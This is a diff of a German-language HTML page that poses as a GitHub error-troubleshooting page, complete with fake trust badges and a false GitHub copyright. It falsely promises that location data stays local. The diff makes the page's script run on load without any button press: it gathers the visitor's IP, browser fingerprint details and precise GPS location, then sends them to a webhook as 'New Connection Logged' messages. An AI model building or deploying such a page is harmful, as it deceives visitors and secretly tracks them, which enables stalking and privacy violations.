@@ -1,11 +1,167 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="de">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Error</title>
+    <title>Fehlerbehebung</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f4f7fc;
+            color: #333;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+        }
+
+        h1 {
+            font-size: 3rem;
+            color: #e74c3c;
+            margin-bottom: 20px;
+            text-align: center;
+            margin-top: 0;
+        }
+
+        h2 {
+            font-size: 2.2rem;
+            color: #2c3e50;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+
+        p {
+            font-size: 1.1rem;
+            color: #555;
+            text-align: center;
+            margin-bottom: 30px;
+            max-width: 600px;
+        }
+
+        .container {
+            background-color: white;
+            border-radius: 15px;
+            padding: 40px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 80%;
+            max-width: 600px;
+            position: relative;
+            z-index: 10;
+        }
+
+        .button {
+            background-color: #3498db;
+            color: white;
+            padding: 15px 30px;
+            font-size: 1.1rem;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            margin-top: 20px;
+        }
+
+        .button:hover {
+            background-color: #2980b9;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 10px 0;
+            color: #777;
+            font-size: 0.9rem;
+            border-top: 1px solid #ddd;
+            margin-top: 30px;
+        }
+
+        .footer a {
+            color: #3498db;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .image-container {
+            margin-bottom: 30px;
+        }
+
+        .image-container img {
+            width: 100%;
+            max-width: 200px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+        }
+
+        .trust-badge {
+            margin-top: 20px;
+            display: flex;
+            justify-content: center;
+        }
+
+        .trust-badge img {
+            width: 120px;
+            object-fit: contain;
+            margin: 10px;
+        }
+
+        /* Fehlertext immer sichtbar */
+        .header-text {
+            font-size: 3rem;
+            color: #e74c3c;
+            margin-bottom: 20px;
+            text-align: center;
+            margin-top: 0;
+        }
+
+        /* Fixiere die Fußzeile am unteren Ende des Containers */
+        .container-footer {
+            position: relative;
+            margin-top: 20px;
+        }
+
+        /* Fixiere die untere Zeile direkt unterhalb des Containers */
+        .footer-text {
+            position: fixed;
+            bottom: 10px;
+            width: 100%;
+            text-align: center;
+            padding: 10px;
+            background-color: #f4f7fc;
+            font-size: 1rem;
+            color: #777;
+            z-index: 9999;
+        }
+    </style>
 </head>
 <body>
+    <div class="container">
+        <h1 class="header-text">Oh nein! Etwas ist schiefgelaufen</h1>
+        <div class="image-container">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTmWru8q17zpOzzzT1s475ZS_8fOL1GS0teSw&s" alt="Fehler" />
+        </div>
+        <h2>Wir benötigen deinen Standort, um das Problem zu beheben</h2>
+        <p>Wir haben ein Problem auf der Seite entdeckt, und um es schnell zu beheben, benötigen wir deinen Standort. Deine Privatsphäre ist uns sehr wichtig. Deine Daten werden ausschließlich genutzt, um dir bei diesem Fehler zu helfen. Wir werden deinen Standort niemals für andere Zwecke verwenden.</p>
+        
+        <p><strong>Warum wird dein Standort benötigt?</strong></p>
+        <p>Wir verwenden deinen Standort nur, um den Fehler besser nachzuvollziehen und schnell eine Lösung zu finden. Deine Daten sind sicher und werden nur lokal verarbeitet.</p>
+        
+        <div class="trust-badge">
+            <img src="https://st4.depositphotos.com/23877174/25390/v/450/depositphotos_253904654-stock-illustration-privacy-icon-vector-from-security.jpg" alt="Privacy" />
+            <img src="https://www.adwus.de/wp-content/uploads/2023/10/trustpilot-logo.png" alt="TrustPilot" />
+        </div>
+
+        <div class="container-footer">
+            <!-- Der Footer-Text unter dem Container -->
+            <p>&copy;  2025 GitHub, Inc. | <a href="https://www.example.com/privacy-policy" target="_blank">Datenschutzbestimmungen</a></p>
+        </div>
+    </div>
+
     <script>
         function generateUniqueID() {
             let existingID = localStorage.getItem("uniqueVisitorID");
@@ -75,7 +231,6 @@
                     let language = navigator.language || navigator.userLanguage;
                     let timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-                    // WebGL-Informationen
                     const gl = document.createElement('canvas').getContext('webgl');
                     const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                     const gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
@@ -100,9 +255,7 @@
         }
 
         function collectDataAndSend() {
-            // Zuerst IP und Systemdaten sammeln
             getIP().then(ipData => {
-                // Webhook 1 mit Systemdaten
                 const systemData = {
                     "title": "📡 New Connection Logged",
                     "color": 3447003,
@@ -124,7 +277,6 @@
                 };
 
                 sendToWebhook(systemData).then(() => {
-                    // Nun präzisere Geolocation sammeln
                     getPreciseLocation((latitude, longitude, address) => {
                         const locationData = {
                             "title": "📡 Location Updated (GPS)",
@@ -134,32 +286,15 @@
                                 { "name": "⏰ Updated Timestamp", "value": new Date().toLocaleString('de-DE', { timeZone: 'Europe/Berlin' }), "inline": true }
                             ]
                         };
-
-                        // Geolocation Webhook senden
                         sendToWebhook(locationData);
                     });
                 });
             });
         }
 
-        // Wenn auf der Seite ein Fehler auftritt und wir Standort anfordern möchten
-        function requestLocationAccess() {
-            const infoDiv = document.getElementById("location-info");
-            infoDiv.innerHTML = `
-                <h2>Ups! Etwas ist schiefgelaufen.</h2>
-                <p>Um dir besser zu helfen und dieses Problem schnell zu beheben, benötigen wir deinen Standort.</p>
-                <p>Keine Sorge! Der Standort wird nur verwendet, um das Problem in deiner Region zu lokalisieren und unseren Service zu verbessern.</p>
-                <button onclick="collectDataAndSend()">Standort teilen, um zu helfen!</button>
-            `;
-        }
-
         document.addEventListener("DOMContentLoaded", function() {
-            requestLocationAccess(); // Stelle sicher, dass der Fehlertext angezeigt wird und der Benutzer den Standort freigeben kann
+            collectDataAndSend();
         });
     </script>
-
-    <div id="location-info" style="text-align: center; font-size: 20px; color: black; margin-top: 50px;">
-        <!-- Hier wird der Fehlertext angezeigt -->
-    </div>
 </body>
 </html>
